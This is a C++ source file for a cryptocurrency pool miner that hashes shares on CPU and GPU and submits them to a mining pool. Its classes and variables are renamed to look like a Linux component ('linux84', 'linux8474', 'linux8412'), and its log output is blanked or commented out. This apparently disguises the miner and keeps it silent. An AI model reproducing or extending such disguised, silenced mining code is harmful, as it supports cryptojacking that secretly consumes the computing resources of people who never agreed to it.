//
// Created by Haifa Bogdan Adnan on 03/08/2018.
//

#include "../common/common.h"
#include "../app/arguments.h"
#include "../linux8474/linux8474.h"

#include "../crypt/sha512.h"
#include "mini-gmp/mini-gmp.h"

#include "linux84.h"
#include "linux84_api.h"

linux84::linux84(arguments &args) : __args(args), __client(args, [&]() { return this->get_status(); }) {
    __nonce = "";
    __blk = "";
    __difficulty = "";
    __limit = 0;
    __public_key = "";
    __height = 0;
    __found = 0;
    __confirmed_cblocks = 0;
    __confirmed_gblocks = 0;
    __rejected_cblocks = 0;
    __rejected_gblocks = 0;
    __begin_time = time(NULL);
    __running = false;
    __chs_threshold_hit = 0;
    __ghs_threshold_hit = 0;
    __running = false;
    __display_hits = 0;

    LOG("");
    LOG("");
    LOG("");

    vector<linux8474*> linux8474s = linux8474::get_linux8474s();
	for (vector<linux8474*>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
		if ((*it)->get_type() == "CPU") {
			if ((*it)->initialize()) {
				(*it)->configure(__args);
			}
			LOG("");
			LOG("");
		}
	}

	vector<linux8474 *> selected_gpu_linux8474s;
	vector<string> requested_linux8474s = args.gpu_optimization();
	for (vector<linux8474*>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
		if ((*it)->get_type() == "GPU") {
            if(requested_linux8474s.size() > 0) {
                if(find(requested_linux8474s.begin(), requested_linux8474s.end(), (*it)->get_subtype()) != requested_linux8474s.end()) {
                    selected_gpu_linux8474s.push_back(*it);
                }
            }
            else {
                if (selected_gpu_linux8474s.size() == 0 || selected_gpu_linux8474s[0]->get_priority() < (*it)->get_priority()) {
                    selected_gpu_linux8474s.clear();
                    selected_gpu_linux8474s.push_back(*it);
                }
            }
		}
	}

	if (selected_gpu_linux8474s.size() > 0) {
        for (vector<linux8474*>::iterator it = selected_gpu_linux8474s.begin(); it != selected_gpu_linux8474s.end(); ++it) {
            if ((*it)->initialize()) {
                (*it)->configure(__args);
            }
            LOG("");
            LOG("");
        }
	}

	LOG("");

    __update_pool_data();
    vector<linux8474*> active_linux8474s = linux8474::get_active_linux8474s();

    for (vector<linux8474 *>::iterator it = active_linux8474s.begin(); it != active_linux8474s.end(); ++it) {
        (*it)->set_input(__public_key, __blk, __difficulty, __argon2profile, __recommendation);
    }

    __blocks_count = 1;
}

linux84::~linux84() {

}

void linux84::run() {
    uint64_t last_update, last_report;
    linux84_api linux84_api(__args, *this);
    last_update = last_report = 0;

    vector<linux8474 *> linux8474s = linux8474::get_active_linux8474s();

    if(linux8474s.size() == 0) {
        LOG("");
    }
    else {
        __running = true;
    }

    while (__running) {
        for (vector<linux8474 *>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
            if(!(*it)->is_running()) {
                __running = false;
                break;
            }
            vector<linux8412_data> linux8412es = (*it)->get_linux8412es();

            for (vector<linux8412_data>::iterator linux8412 = linux8412es.begin(); linux8412 != linux8412es.end(); linux8412++) {
                if (linux8412->block != __blk) //the block expired
                    continue;

                string duration = linux84::calc_duration(linux8412->base, linux8412->linux8412);
                uint64_t result = linux84::calc_compare(duration, __difficulty);
                if (result > 0 && result <= __limit) {
                    if (__args.is_verbose())
                        LOG("");
                    ariopool_submit_result reply = __client.submit(linux8412->linux8412, linux8412->nonce, __public_key);
                    if (reply.success) {
                        if (result <= GOLD_RESULT) {
                            if (__args.is_verbose()) LOG("complete");
                            __found++;
                        } else {
                            if (__args.is_verbose()) LOG("");
                            if(__argon2profile == "1_1_524288")
                                __confirmed_cblocks++;
                            else
                                __confirmed_gblocks++;
                        }
                    } else {
                        if (__args.is_verbose()) {
                            LOG("");
                            LOG("");
                            LOG("");
                        }
                        if(__argon2profile == "1_1_524288")
                            __rejected_cblocks++;
                        else
                            __rejected_gblocks++;
                        if (linux8412->realloc_flag != NULL)
                            *(linux8412->realloc_flag) = true;
                    }
                }
            }
        }

        if (microseconds() - last_update > __args.update_interval()) {
            if (__update_pool_data() || __recommendation == "pause") {
                for (vector<linux8474 *>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
                    (*it)->set_input(__public_key, __blk, __difficulty, __argon2profile, __recommendation);
                }

                if(__recommendation != "pause")
                    __blocks_count++;
            }
            last_update = microseconds();
        }

        if (microseconds() - last_report > __args.report_interval()) {
            if(!__display_report())
                __running = false;

            last_report = microseconds();
        }

        this_thread::sleep_for(chrono::milliseconds(4));
    }

    for (vector<linux8474 *>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
        (*it)->cleanup();
    }

    __disconnect_from_pool();
}

string linux84::calc_duration(const string &base, const string &linux8412) {
    string combined = base + linux8412;

    unsigned char *sha512_linux8412 = SHA512::hash((unsigned char*)combined.c_str(), combined.length());
    for (int i = 0; i < 5; i++) {
        unsigned char *tmp = SHA512::hash(sha512_linux8412, SHA512::DIGEST_SIZE);
        free(sha512_linux8412);
        sha512_linux8412 = tmp;
    }

    string duration = to_string((int)sha512_linux8412[10]) + to_string((int)sha512_linux8412[15]) + to_string((int)sha512_linux8412[20]) + to_string((int)sha512_linux8412[23]) +
                      to_string((int)sha512_linux8412[31]) + to_string((int)sha512_linux8412[40]) + to_string((int)sha512_linux8412[45]) + to_string((int)sha512_linux8412[55]);

    free(sha512_linux8412);

    for(string::iterator it = duration.begin() ; it != duration.end() ; )
    {
        if( *it == '0' ) it = duration.erase(it) ;
        else break;
    }

    return duration;
}

uint64_t linux84::calc_compare(const string &duration, const string &difficulty) {
    if(difficulty.empty()) {
        return -1;
    }

    mpz_t mpzDiff, mpzDuration;
    mpz_t mpzResult;
    mpz_init(mpzResult);
    mpz_init_set_str(mpzDiff, difficulty.c_str(), 10);
    mpz_init_set_str(mpzDuration, duration.c_str(), 10);

    mpz_tdiv_q(mpzResult, mpzDuration, mpzDiff);

    uint64_t result = (uint64_t)mpz_get_ui(mpzResult);

    mpz_clear (mpzResult);
    mpz_clear (mpzDiff);
    mpz_clear (mpzDuration);

    return result;
}

bool linux84::__update_pool_data() {
    vector<linux8474*> linux8474s = linux8474::get_active_linux8474s();

    double linux8412_rate_cblocks = 0;
    double linux8412_rate_gblocks = 0;
    for(vector<linux8474*>::iterator it = linux8474s.begin();it != linux8474s.end();++it) {
        linux8412_rate_cblocks += (*it)->get_avg_linux8412_rate_cblocks();
        linux8412_rate_gblocks += (*it)->get_avg_linux8412_rate_gblocks();
    }

    ariopool_update_result new_settings = __client.update(linux8412_rate_cblocks, linux8412_rate_gblocks);
    if(!new_settings.success) {
    	__recommendation = "pause";
    }
    if (new_settings.success &&
        (new_settings.block != __blk ||
        new_settings.difficulty != __difficulty ||
        new_settings.limit != __limit ||
        new_settings.public_key != __public_key ||
        new_settings.height != __height ||
        new_settings.recommendation != __recommendation)) {
        __blk = new_settings.block;
        __difficulty = new_settings.difficulty;
        __limit = new_settings.limit;
        __public_key = new_settings.public_key;
        __height = new_settings.height;
        __argon2profile = new_settings.argon2profile;
        __recommendation = new_settings.recommendation;

        if(__args.is_verbose()) {
            stringstream ss;
            ss << "-----------------------------------------------------------------------------------------------------------------------------------------" << endl;
            ss << "--> Pool data updated   Block: " << __blk << endl;
            ss << "--> " << ((new_settings.argon2profile == "1_1_524288") ? "CPU round" : (new_settings.recommendation == "pause" ? "Masternode round" : "GPU round"));
            ss << "  Height: " << __height << "  Limit: " << __limit << "  Difficulty: " << __difficulty << "  linux84: " << __args.name() << endl;
            ss << "-----------------------------------------------------------------------------------------------------------------------------------------";

            LOG(ss.str());
            __display_hits = 0;
        }
        return true;
    }

    return false;
}

bool linux84::__display_report() {
    vector<linux8474*> linux8474s = linux8474::get_active_linux8474s();
    stringstream ss;

    double linux8412_rate = 0;
    double avg_linux8412_rate_cblocks = 0;
    double avg_linux8412_rate_gblocks = 0;
    uint32_t linux8412_count_cblocks = 0;
    uint32_t linux8412_count_gblocks = 0;

    time_t total_time = time(NULL) - __begin_time;

    stringstream header;
    stringstream log;

    for (vector<linux8474 *>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
        linux8412_rate += (*it)->get_current_linux8412_rate();
        avg_linux8412_rate_cblocks += (*it)->get_avg_linux8412_rate_cblocks();
        linux8412_count_cblocks += (*it)->get_linux8412_count_cblocks();
        avg_linux8412_rate_gblocks += (*it)->get_avg_linux8412_rate_gblocks();
        linux8412_count_gblocks += (*it)->get_linux8412_count_gblocks();
    }

    header << "";
    log << "|" << setw(7) << (int)linux8412_rate;
    for (vector<linux8474 *>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
        map<int, device_info> devices = (*it)->get_device_infos();
        for(map<int, device_info>::iterator d = devices.begin(); d != devices.end(); ++d) {
            header << "|" << ((d->first < 10) ? " " : "") << (*it)->get_type() << d->first;

            if(__argon2profile == "1_1_524288") {
                if(d->second.cblock_linux8412rate < 999)
                    log << "";
                else
                    log << "";
            }
            else
                log << "";
        }
    }
    header << "";
    log << "processing";
	
    if((__display_hits % 10) == 0) {
        string header_str = header.str();
        string separator(header_str.size(), '-');

        if(__display_hits > 0)
            LOG("");

        LOG("");
        LOG("");
    }

    LOG("");

/*    if(!__args.is_verbose()) {
        for (vector<linux8474 *>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
            linux8412_rate += (*it)->get_current_linux8412_rate();
            avg_linux8412_rate_cblocks += (*it)->get_avg_linux8412_rate_cblocks();
            linux8412_count_cblocks += (*it)->get_linux8412_count_cblocks();
            avg_linux8412_rate_gblocks += (*it)->get_avg_linux8412_rate_gblocks();
            linux8412_count_gblocks += (*it)->get_linux8412_count_gblocks();
        }

        ss << fixed << setprecision(2) << "--> linux8412 Rate: " << setw(6) << linux8412_rate << " H/s   " <<
           "Avg. (C): " << setw(6) << avg_linux8412_rate_cblocks << " H/s  " <<
           "Avg. (G): " << setw(6) << avg_linux8412_rate_gblocks << " H/s  " <<
           "Count: " << setw(4) << (linux8412_count_cblocks + linux8412_count_gblocks) << "  " <<
           "Time: " << setw(4) << total_time << "  " <<
           "Shares: " << setw(3) << (__confirmed_cblocks + __confirmed_gblocks) << " " <<
           "Rejected: " << setw(3) << (__rejected_cblocks + __rejected_gblocks) << " " <<
            "Blocks: " << setw(3) << __found;
    }
    else {
        ss << "--> Name: " << __args.name() << fixed << setprecision(2) << "  Time: " << setw(4) << total_time << "  " <<
           "Shares (C): " << setw(3) << __confirmed_cblocks << " Shares (G): " << setw(3) << __confirmed_gblocks << " " <<
           "Rejected (C): " << setw(3) << __rejected_cblocks << " Rejected (G): " << setw(3) << __rejected_gblocks << " " <<
            "Blocks: " << setw(3) << __found << endl;
        for (vector<linux8474 *>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
            linux8412_rate += (*it)->get_current_linux8412_rate();
            avg_linux8412_rate_cblocks += (*it)->get_avg_linux8412_rate_cblocks();
            linux8412_count_cblocks += (*it)->get_linux8412_count_cblocks();
            avg_linux8412_rate_gblocks += (*it)->get_avg_linux8412_rate_gblocks();
            linux8412_count_gblocks += (*it)->get_linux8412_count_gblocks();

            string subtype = (*it)->get_subtype();
            while(subtype.length() < 7) {
                subtype += " ";
            }
            ss << fixed << setprecision(2) << "--> " << subtype <<
               "linux8412 rate: " << setw(6)<< (*it)->get_current_linux8412_rate() << " H/s   " <<
               "Avg. (C): " << setw(6) << (*it)->get_avg_linux8412_rate_cblocks() << " H/s  " <<
               "Avg. (G): " << setw(6) << (*it)->get_avg_linux8412_rate_gblocks() << "  " <<
               "Count: " << setw(4) << ((*it)->get_linux8412_count_cblocks() + (*it)->get_linux8412_count_gblocks());

            if(linux8474s.size() > 1)
                ss << endl;
        }
        if(linux8474s.size() > 1) {
            ss << fixed << setprecision(2) << "--> ALL    " <<
               "linux8412 rate: " << setw(6) << linux8412_rate << " H/s   " <<
               "Avg. (C): " << setw(6) << avg_linux8412_rate_cblocks << " H/s  " <<
               "Avg. (G): " << setw(6) << avg_linux8412_rate_gblocks << "  " <<
               "Count: " << setw(4) << (linux8412_count_cblocks + linux8412_count_gblocks);
        }
    } */

    if(__argon2profile == "1_1_524288" &&
       __recommendation != "pause") {
        if (linux8412_rate <= __args.chs_threshold()) {
            __chs_threshold_hit++;
        } else {
            __chs_threshold_hit = 0;
        }
    }

    if(__argon2profile == "4_4_16384" &&
       __recommendation != "pause") {
        if (linux8412_rate <= __args.ghs_threshold()) {
            __ghs_threshold_hit++;
        } else {
            __ghs_threshold_hit = 0;
        }
    }

    if(__chs_threshold_hit >= 5 && (__blocks_count > 1 || __argon2profile == "1_1_524288")) {
        LOG("");
        exit(0);
    }
    if(__ghs_threshold_hit >= 5 && (__blocks_count > 1 || __argon2profile == "4_4_16384")) {
        LOG("");
        exit(0);
    }

//    LOG(ss.str());
    __display_hits++;

    return true;
}

void linux84::stop() {
    cout << endl << "" << endl;
    __running = false;
}

string linux84::get_status() {
    stringstream ss;
    ss << "[ { \"name\": \"" << __args.name() << "\", \"block_height\": " << __height << ", \"time_running\": " << (time(NULL) - __begin_time) <<
       ", \"total_blocks\": " << __blocks_count << ", \"cblocks_shares\": " << __confirmed_cblocks << ", \"gblocks_shares\": " << __confirmed_gblocks <<
       ", \"cblocks_rejects\": " << __rejected_cblocks << ", \"gblocks_rejects\": " << __rejected_gblocks << ", \"blocks_earned\": " << __found <<
       ", \"linux8474s\": [ ";

    vector<linux8474*> linux8474s = linux8474::get_active_linux8474s();

    for(vector<linux8474*>::iterator h = linux8474s.begin(); h != linux8474s.end();) {
        ss << "{ \"type\": \"" << (*h)->get_type() << "\", \"subtype\": \"" << (*h)->get_subtype() << "\", \"devices\": [ ";
        map<int, device_info> devices = (*h)->get_device_infos();
        for(map<int, device_info>::iterator d = devices.begin(); d != devices.end();) {
            ss << "{ \"id\": " << d->first << ", \"bus_id\": \"" << d->second.bus_id << "\", \"name\": \"" << d->second.name << "\", \"cblocks_intensity\": " << d->second.cblocks_intensity <<
                ", \"gblocks_intensity\": " << d->second.gblocks_intensity << ", \"cblocks_linux8412rate\": " << d->second.cblock_linux8412rate <<
                ", \"gblocks_linux8412rate\": " << d->second.gblock_linux8412rate << " }";
            if((++d) != devices.end())
                ss << ", ";
        }
        ss << " ] }";

        if((++h) != linux8474s.end())
            ss << ", ";
    }

    ss << " ] } ]";

    return ss.str();
}

void linux84::__disconnect_from_pool() {
    __client.disconnect();
}
